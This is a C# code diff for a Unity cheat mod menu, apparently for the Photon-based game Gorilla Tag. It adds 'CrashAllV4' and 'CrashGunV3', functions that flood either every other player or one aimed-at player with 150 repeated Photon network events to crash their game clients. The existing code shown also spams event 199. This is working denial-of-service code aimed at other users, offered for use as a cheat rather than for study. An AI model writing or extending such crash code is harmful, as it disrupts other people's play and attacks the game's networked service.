@@ -3,6 +3,7 @@ using GorillaNetworking;
 using JupiterX.Classes;
 using JupiterX.Menu;
 using Photon.Pun;
+using Photon.Realtime;
 using System.Linq;
 using UnityEngine;
 
@@ -334,6 +335,39 @@ namespace JupiterX.Mods
                         PhotonNetwork.NetworkingClient.OpRaiseEvent(199, domycumbust, null, ExitGames.Client.Photon.SendOptions.SendUnreliable);
                         PhotonNetwork.NetworkingClient.OpRaiseEvent(199, domycumbust, null, ExitGames.Client.Photon.SendOptions.SendUnreliable);
                         PhotonNetwork.NetworkingClient.OpRaiseEvent(199, domycumbust, null, ExitGames.Client.Photon.SendOptions.SendUnreliable);
+                    }
+                }
+            }
+        }
+
+        public static void CrashAllV4()
+        {
+            if (Utility.RTrigger)
+            {
+                for (int i = 0; i < 150; i++)
+                {
+                    PhotonNetwork.RaiseEvent(2, null, new RaiseEventOptions { Receivers = ReceiverGroup.Others }, SendOptions.SendUnreliable);
+                    PhotonNetwork.RaiseEvent(3, null, new RaiseEventOptions { Receivers = ReceiverGroup.Others }, SendOptions.SendUnreliable);
+                }
+                PhotonNetwork.SendAllOutgoingCommands();
+            }
+        }
+
+        public static void CrashGunV3()
+        {
+            if (Main.GetGunInput(false))
+            {
+                var GunData = Main.RenderGun();
+                GameObject NewPointer = GunData.NewPointer;
+                RaycastHit Ray = GunData.Ray;
+                Photon.Realtime.Player plr = Ray.collider.GetComponentInParent<PhotonView>().Owner;
+
+                if (Main.GetGunInput(true))
+                {
+                    for (int i = 0; i < 150; i++)
+                    {
+                        PhotonNetwork.RaiseEvent(2, null, new RaiseEventOptions { TargetActors = new int[] { plr.actorNumber } }, SendOptions.SendUnreliable);
+                        PhotonNetwork.RaiseEvent(3, null, new RaiseEventOptions { TargetActors = new int[] { plr.actorNumber } }, SendOptions.SendUnreliable);
                     }
                 }
             }
